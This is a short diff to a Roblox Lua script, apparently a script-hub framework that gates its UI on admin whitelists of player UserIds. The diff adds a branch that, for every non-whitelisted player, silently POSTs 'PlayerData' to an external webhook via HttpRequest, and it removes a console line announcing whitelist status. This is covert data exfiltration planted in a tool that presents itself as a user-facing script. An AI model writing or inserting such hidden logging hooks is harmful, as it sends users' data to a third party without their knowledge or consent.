@@ -48,7 +48,10 @@ end
   elseif framework.admin_accounts.smail_accounts[game.Players.LocalPlayer.UserId] then
   elseif framework.admin_accounts.max_accounts[game.Players.LocalPlayer.UserId] then
   elseif framework.admin_accounts.raven_accounts[game.Players.LocalPlayer.UserId] then
+  else
+      HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
   end
+end
 
 local chromaColor
 local rainbowTime = 5
@@ -2107,7 +2110,6 @@ function framework:LoadUI()
   end)
       framework:LoadUI()
       framework:sendNotification("UI Loaded, Enjoy!")
-      warn(game.Players.LocalPlayer.Name.." is whitelisted")
       return
      end
 
